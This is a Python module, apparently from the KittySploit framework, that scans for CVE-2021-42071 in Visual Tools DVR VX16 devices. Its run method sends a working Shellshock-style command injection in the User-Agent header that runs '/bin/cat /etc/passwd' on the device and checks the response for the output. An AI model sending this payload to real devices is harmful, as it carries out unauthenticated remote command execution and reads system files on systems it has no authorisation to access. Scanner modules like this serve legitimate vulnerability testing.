#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Visual Tools DVR VX16 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Visual Tools DVR VX16 4.2.28.0 - Unauthenticated OS Command Injection Detection',
        'description': 'Visual Tools DVR VX16 4.2.28.0 could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'edb', 'visualtools', 'rce', 'oast', 'injection', 'visual-tools', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50098',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-42071',
            'https://visual-tools.com/',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-42071',
    }

    def run(self):
        path = '/cgi-bin/slogin/login.py'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept': '*/*', 'User-Agent': '() { :; }; echo ; echo ; /bin/cat /etc/passwd'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Visual Tools DVR VX16 4.2.28.0 - Unauthenticated OS Command Injection detected', path=path)
            return True
        return False

